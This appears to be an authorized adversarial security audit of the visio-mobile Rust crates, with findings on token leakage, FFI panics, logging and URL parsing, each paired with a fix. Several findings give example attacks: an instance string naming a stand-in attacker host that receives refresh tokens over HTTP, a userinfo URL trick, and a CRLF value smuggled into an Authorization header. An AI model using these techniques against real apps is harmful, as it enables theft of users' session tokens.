# Hostile Security Audit — visio-mobile Rust crates

**Date:** 2026-06-04
**Target:** working tree on `main`, focus on auth/token/PKCE refactor.
**Scope:** `visio-core` (pkce/tokens/session/auth/lobby/access/room/chat) + `visio-ffi` (UniFFI surface for PKCE).
**Audit type:** hostile / adversarial review on the user's own beta product (authorized).

---

## CRITICAL

### C1. `scheme_for()` downgrades attacker-named hosts to HTTP, leaking refresh + access tokens
- **Severity**: Critical
- **Location**: `crates/visio-core/src/tokens.rs:19-44`, used at `tokens.rs:102`, `tokens.rs:158`, `crates/visio-ffi/src/lib.rs:1726`.
- **Attack**: `scheme_for` decides HTTP vs HTTPS by string-prefix matching. The matches are unsound:
  - `h.starts_with("10.")` matches `10.evil.com`, `10.attacker.example`.
  - `h.starts_with("172.16.")` … `172.31.` are correct, but `h.starts_with("10.")` matches every public IP in `10.*` only if it's an IP, AND every host that *textually* starts with `10.` (e.g. `10.notmyhost.com`). Same for `192.168.*.com`.
  - There is no validation that the host is a real RFC1918 IP or a real loopback name. `10.0.2.2.attacker.com` → HTTP.
  - The host is then plugged into `format!("{}://{}/api/v1.0/oauth/token/refresh/", ...)` and the **refresh token JSON body is POSTed in cleartext** to the attacker.
  - `meet_instance` is sourced from `client.getMeetInstances().firstOrNull()` (`VisioManager.kt:313, 322`) and from user input (deep-link / settings UI). An attacker who can seed an instance string (malicious calendar link, settings import, alias) can force token exfiltration over HTTP.
- **PoC**: settings contains `meet_instance = "10.0.2.2.attacker.tld"`. Next `refresh_tokens()` call POSTs `{"refresh":"<JWT>"}` to `http://10.0.2.2.attacker.tld/api/v1.0/oauth/token/refresh/`. Attacker now has a valid refresh token.
- **Fix**: parse the host with `std::net::IpAddr::from_str` (only RFC1918 IPs allowed for HTTP); for hostnames, only allow exact equality `localhost` / `10.0.2.2` / `10.0.3.2`. Better: require explicit dev-only opt-in (env var / debug build) and default to HTTPS unconditionally in release.

### C2. New FFI token entry points are not wrapped in `catch_unwind` — panics cross the FFI boundary (UB)
- **Severity**: Critical (per project policy — AGENTS.md:147)
- **Location**: `crates/visio-ffi/src/lib.rs:1662 exchange_pkce_code`, `1685 set_tokens`, `1712 refresh_tokens`, `1774 logout`, `1783 validate_session`, `1791 create_room`, `131 pkce_generate`. Only `connect` (1230) and `connect_with_token` (1285) are wrapped.
- **Attack**: any panic in `serde_json::from_str`, `reqwest`, `HeaderValue::from_str`, `self.session_manager.lock().unwrap()` (poisoned mutex), `self.rt.block_on` inside a tokio panic, or in `visio_core::SessionManager::fetch_user` becomes Undefined Behaviour on the FFI boundary → SIGSEGV / memory corruption on Android JNI / iOS Swift caller. `.unwrap()` on `session_manager.lock()` is the easiest trigger: any `panic!` in another method poisons the mutex, then *every* subsequent `set_tokens` / `refresh_tokens` / `logout` panics → JVM/Swift crash.
- **PoC**: cause one panic in any path holding `session_manager` lock (e.g. `expect()` in the JNI surface code at `lib.rs:45` panics on `nativeInitWebrtc` error → not directly poisoning but illustrative). More direct: any future code change in `fetch_user` that panics will trickle straight out of `set_tokens`.
- **Fix**: wrap every FFI method body in `std::panic::catch_unwind(AssertUnwindSafe(|| ...))`, mapping panics to `VisioError::Generic`. Replace `.lock().unwrap()` with `.lock().unwrap_or_else(|p| p.into_inner())` (already used in sync mutexes elsewhere in the file).

---

## HIGH

### H1. `TokenPair` derives `Debug`, `Serialize`, `Clone` with raw secrets — logged via Display chain
- **Severity**: High
- **Location**: `crates/visio-core/src/tokens.rs:47-51`, `crates/visio-core/src/session.rs:18, 40, 57`, `crates/visio-ffi/src/lib.rs:125-128`.
- **Attack**: `TokenPair`, `SessionState::Authenticated { tokens, ... }`, and `UserInfo` all `#[derive(Debug)]`. In `visio-ffi/src/lib.rs:821`, `tracing::error!("VisioError: {e}");` logs *every* error returned from core. If a future caller does `tracing::error!("...{state:?}")`, or any `unwrap_or_else(|e| panic!("session: {state:?}"))`, the access + refresh JWT lands in logcat. Today, `crates/visio-core/src/session.rs:280` already emits the **full Meet API JSON body** at `tracing::error!` level on `serde_json::from_str` failure of `CreateRoomResponse` — that body contains the LiveKit JWT, which is a meeting credential.
- **PoC**: send a malformed `CreateRoomResponse` (e.g. server has a transient schema change) → `tracing::error!` writes the full JSON, LiveKit token included, to logcat → any installed app with `READ_LOGS` (impossible on stock Android post-4.x, but available on rooted/dev devices and via `adb logcat`) reads it.
- **Fix**: implement manual `Debug` for `TokenPair`/`SessionState` redacting the access/refresh fields; drop the body from `session.rs:280-281` (`tracing::debug!("create_room status={}", status)` instead).

### H2. `tokens.rs::exchange_pkce_code` and `refresh_tokens`, and FFI `refresh_tokens` (`lib.rs:1729-1748`) use default `reqwest::Client::new()` — follows redirects by default
- **Severity**: High
- **Location**: `tokens.rs:110, 161`, `visio-ffi/src/lib.rs:1732`, `session.rs:153, 248`, `access.rs` (every method), `lobby.rs:176, 221` for waiting-room admin/list.
- **Attack**: `auth.rs:55` correctly sets `Policy::none()` and `lobby.rs:71, 132` likewise — but none of the new token paths or access/admin paths do. `reqwest` 0.12 default policy follows up to 10 redirects. While reqwest does strip the `Authorization` header on **cross-host** redirects (since 0.11.7), it does **NOT** strip on same-host redirects, port changes, or HTTPS→HTTP downgrades to the same host. A misconfigured Meet instance (or a compromised reverse proxy) returning `302 http://meet.numerique.gouv.fr/` (same host, plaintext) drains the Bearer over HTTP.
- Combined with C1: if `meet_instance` is downgraded to HTTP, even the *first* hop is plaintext; redirects make it worse.
- **Fix**: build a shared `reqwest::Client` with `.redirect(reqwest::redirect::Policy::none())` and `.https_only(true)` in release builds; reuse it everywhere instead of `reqwest::Client::new()`. Set a `.timeout()` while you're there (tokens.rs has none, so a hung server stalls FFI threads forever).

### H3. `SessionManager::create_room` logs full response body at debug
- **Severity**: High (log exposure of LiveKit JWT)
- **Location**: `session.rs:277` — `tracing::debug!("create_room response body: {}", body);` *before* parsing. The body always contains `livekit.token` — a JWT that grants room admin to whoever holds it (mint date, expiry, room name, permissions).
- **Attack**: in any build where `EnvFilter` includes `visio_core=debug` (the default in `init_logging` at `visio-ffi/src/lib.rs:103`!), every room creation writes the LiveKit JWT to logcat / syslog.
- **PoC**: launch a meeting; `adb logcat | grep create_room` from any USB-debug-enabled session prints the JWT.
- **Fix**: drop the line, or change to `tracing::debug!("create_room status={} body_len={}", status, body.len())`.

---

## MEDIUM

### M1. `parse_meet_url` strips scheme by `.replace("https://", "")` — vulnerable to userinfo / unusual schemes / mixed-case
- **Severity**: Medium
- **Location**: `auth.rs:152-190`.
- **Attack**:
  - `"HTTPS://evil.com/abc-defg-hij"` → `lower.starts_with("javascript:")` etc. checks are done on `url` after the case-sensitive `replace("https://", "")` — so `HTTPS://` is NOT stripped; the next split-on-`/` puts `https:` (uppercase) into `parts[0]`, instance = `"HTTPS:"`, slug = `"//evil.com/abc-defg-hij"` and the slug regex would reject it, but the `parse_meet_url` (no slug regex) would accept the malformed instance and the subsequent `format!("https://{}/...", instance)` produces `https://HTTPS://evil.com/...`. reqwest may parse that to `evil.com`. Net: a deep-link with mixed-case scheme can be used to confuse downstream URL construction.
  - URL userinfo: `parse_meet_url("victim.com@attacker.com/abc-defg-hij")` returns `instance="victim.com@attacker.com"`, slug ok; the eventual `format!("https://{}/api/...", instance)` → reqwest resolves this as `attacker.com` with userinfo `victim.com`. **Bearer header is sent to attacker.com.** (Same site as the format string.)
  - `Authorization` header smuggling: every `format!("Bearer {}", access_token)` is unchecked. JWTs are base64url and shouldn't contain `\r\n`, but `set_tokens` accepts any caller-provided `access: String`. If a malicious deep-link drives `set_tokens("https://meet.x/", "tok\r\nX-Smuggle: y", "ref")`, `session.rs:147-150` uses `HeaderValue::from_str` which *will* reject CRLF (returns `InvalidHeaderValue`, mapped to `VisioError::Http`). However, `access.rs:60, 99, 143, 187`, `session.rs:251`, `lobby.rs:181, 224` all use `.header(AUTHORIZATION, format!("Bearer {}", access_token))` directly. reqwest's `header()` setter does validate and will panic on invalid bytes — combined with C2 (no `catch_unwind`), a malicious token containing CRLF crashes the FFI.
- **Fix**: parse with `url::Url::parse`, reject any URL whose `host_str() != url.authority()` (catches userinfo). Lowercase the scheme check. For Bearer: validate the access token is `[A-Za-z0-9._\-]+` before construction; or use `HeaderValue::from_str` everywhere and map errors.

### M2. `is_oidc_enabled_runtime` TOCTOU between flag check and login flow
- **Severity**: Medium
- **Location**: `session.rs:13-16` plus call sites that pre-check the flag, then call `exchange_pkce_code` / `set_tokens` without rechecking.
- **Attack**: OIDC feature flag flipped off server-side mid-flow; client still completes PKCE exchange and persists tokens. If the flag was flipped because OIDC was found broken/compromised, the client still authenticates and stores tokens.
- **Fix**: re-check `is_oidc_enabled_runtime` inside `exchange_pkce_code` and refuse if disabled. Also clear stored tokens on flag→false transition.

### M3. FFI `refresh_tokens` bypasses `tokens::TokenStore::refresh_lock`, enabling concurrent double-refresh / lost-update
- **Severity**: Medium
- **Location**: `crates/visio-ffi/src/lib.rs:1712-1754`.
- **Attack**: comment at line 1722 says "the FFI session_manager already serializes access via its Mutex" — but the mutex is **released between the two operations** (line 1714 drops the guard, line 1751 reacquires). Two concurrent FFI callers both observe the same `current_refresh`, both POST it to the server. If the backend rotates refresh tokens on use (standard SimpleJWT behaviour), the second response invalidates the first; whichever response is applied last wins, the other caller now holds a token that's *already* in `session` but was minted from an invalidated refresh. Worst case: one of the two refreshes silently fails and the session.update_tokens stores stale tokens.
- Also: `self.session_manager.lock().unwrap()` (lines 1714, 1751) — poisoning crashes the app per C2.
- **Fix**: hold the session_manager lock across the network call, or use the `TokenStore::refresh_lock` `Mutex` (which is async-safe). Replace `.unwrap()` with `.unwrap_or_else(|p| p.into_inner())`.

### M4. `serde_json::from_str` has no size limit on response bodies
- **Severity**: Medium
- **Location**: every `resp.text().await` followed by `serde_json::from_str` (tokens.rs:119, 178; session.rs:168, 272; access.rs:74, 113, 163; lobby.rs:103, 153, 194).
- **Attack**: a malicious or compromised Meet backend returns a multi-GB `UserInfo`/`TokenPair`/`CreateRoomResponse`; `resp.text()` allocates it all → OOM-kill the mobile process. Same for deeply-nested JSON (serde_json default recursion limit is 128, OK, but no size cap).
- **Fix**: cap with `resp.bytes().await?` + size check, or use `reqwest`'s `Response::content_length()` enforcement / `.text_with_charset` with a byte limit (or build a custom limited stream). 10 MB cap is plenty for these endpoints.

### M5. `std::sync::Mutex` for `session_manager` held across `rt.block_on()` of async HTTP
- **Severity**: Medium (DoS / reentrancy)
- **Location**: `visio-ffi/src/lib.rs:1685-1707 set_tokens`, `1712-1754 refresh_tokens`. `set_tokens` calls `block_on(fetch_user(...))` **without** holding the mutex, then re-locks — OK. But `logout` (1774) and `validate_session` (1783) take the StdMutex lock *and then* call `block_on(session.logout/.validate_session)` — both async — which means a panic in async code holds the lock across the panic, and any concurrent FFI call blocks until the runtime returns. If the network call hangs (M2: no timeout), the entire SessionManager is wedged.
- **Fix**: clone/extract the data you need (e.g. `meet_url`, `tokens`) outside the lock, do the async call without the lock, then re-lock to apply the result.

---

## LOW / INFO

### L1. `rand::thread_rng()` for PKCE verifier/state — *acceptable but not best practice*
- **Severity**: Low (info)
- **Location**: `pkce.rs:37`.
- **Analysis**: `rand` 0.8 `ThreadRng` is ChaCha12-based, reseeded from OS entropy on initial use and periodically thereafter; cryptographically adequate per the `rand` documentation ("Quality: secure"). 32 bytes = 256 bits, no truncation. Tests verify base64url alphabet (43 chars, no padding). `Sha256` correct. **No issue exploitable today.**
- **Fix (defensive)**: use `rand::rngs::OsRng` directly for the verifier and state to remove any doubt about reseed timing and to make the intent explicit ("cryptographic, not just secure-ish"). One-line change: `OsRng.fill_bytes(&mut buf)`.

### L2. PKCE `state` is generated but never verified mobile-side
- **Severity**: Low
- **Location**: `pkce.rs:18`, `OidcAuthManager.kt` flow (state generated, sent to /authenticate/, returned in deep-link callback).
- **Attack**: PKCE `state` is the CSRF defence against an attacker injecting an authorization code via the deep-link. If `OidcAuthManager.parseCallback` does **not** compare the returned state byte-for-byte (in constant time) against the stored state, an attacker who can deliver a deep-link with `code=<his_own_code>&state=<anything>` to the victim's app forces the victim to bind the attacker's account to the victim's session.
- **Fix**: in `OidcAuthManager.parseCallback`, verify `returnedState == storedState` via `MessageDigest.isEqual` (constant-time) before invoking `exchangePkceCode`. (Kotlin-side; flag for the user to verify — out of Rust scope but enabled by Rust generating state.)

### L3. Bearer token sent on `access.rs` + `session.rs` + `lobby.rs` without explicit redirect policy
- **Severity**: Low (covered by H2 — same fix).
- **Location**: same list as H2.

### L4. No `unsafe` review issues in the new code
- `crates/visio-core/src/pkce.rs`, `tokens.rs`, `session.rs`, `auth.rs`, `lobby.rs`, `access.rs`: no `unsafe` blocks. Clean.
- `visio-ffi/src/lib.rs` `unsafe` is concentrated in the JNI camera/audio frame pipeline (lines 2204-2484) and is **outside this audit's primary scope**, but spot-check: `JNIEnv::from_raw` at line 45 calls `.expect("nativeInitWebrtc: invalid JNIEnv")` — a panic here violates AGENTS.md:147 just like C2. Lift to error-return.

### L5. `chat.rs` AES-256-GCM sanity check
- HKDF-SHA256 derivation with proper salt/info separation (`b"visio-chat-v1"` salt, `b"aes-256-gcm"` info). Random nonce from `aead::OsRng` — correct CSPRNG. Authenticated AEAD via `Aes256Gcm::encrypt/decrypt` (tag included). Length check at line 76 (`< NONCE_SIZE + 1`) is correct for AEAD (tag is appended).
- **Caveat (out of scope for this pass)**: chat key is derived from `room.name()` — i.e. the LiveKit room name. If the room name is server-controllable and not a high-entropy secret, all "encrypted" chat is decryptable by anyone who knows the room name. This is by design for inter-op with the Meet web client but should be documented as "obfuscation, not confidentiality from the server".
- No findings in this category for the current diff.

### L6. Timing-attack categories — no client-side secret comparisons
- No `==` comparisons of access/refresh tokens, PKCE verifiers, or chat MAC tags anywhere in `crates/visio-core` or the audited FFI surface. AEAD verification handles the tag in constant time inside `aes-gcm`. **No findings.**

---

## Summary

- **2 Critical**: HTTP scheme downgrade leaking refresh tokens (C1); unguarded FFI panic boundary (C2).
- **3 High**: Debug-derive + tracing exposing tokens (H1, H3); default redirect/no-timeout reqwest clients on token paths (H2).
- **5 Medium**: URL parser bypasses (M1); flag-flip TOCTOU (M2); refresh race (M3); unbounded JSON (M4); lock-across-block_on (M5).
- **Lows/info**: ThreadRng acceptable but OsRng preferred (L1); state-verification reminder for Kotlin (L2); chat crypto sanity OK (L5); no timing-attack issues found (L6).

**Priority fix order**: C1 → C2 → H3 → H1 → H2 → M3 → M5 → rest.

## Files in scope

- `/home/mmaudet/work/visio-mobile/crates/visio-core/src/pkce.rs`
- `/home/mmaudet/work/visio-mobile/crates/visio-core/src/tokens.rs`
- `/home/mmaudet/work/visio-mobile/crates/visio-core/src/session.rs`
- `/home/mmaudet/work/visio-mobile/crates/visio-core/src/auth.rs`
- `/home/mmaudet/work/visio-mobile/crates/visio-core/src/access.rs`
- `/home/mmaudet/work/visio-mobile/crates/visio-core/src/lobby.rs`
- `/home/mmaudet/work/visio-mobile/crates/visio-core/src/chat.rs`
- `/home/mmaudet/work/visio-mobile/crates/visio-core/src/errors.rs`
- `/home/mmaudet/work/visio-mobile/crates/visio-core/src/room.rs`
- `/home/mmaudet/work/visio-mobile/crates/visio-ffi/src/lib.rs`
- `/home/mmaudet/work/visio-mobile/crates/visio-ffi/src/visio.udl`
- `/home/mmaudet/work/visio-mobile/Cargo.lock`
- `/home/mmaudet/work/visio-mobile/AGENTS.md`
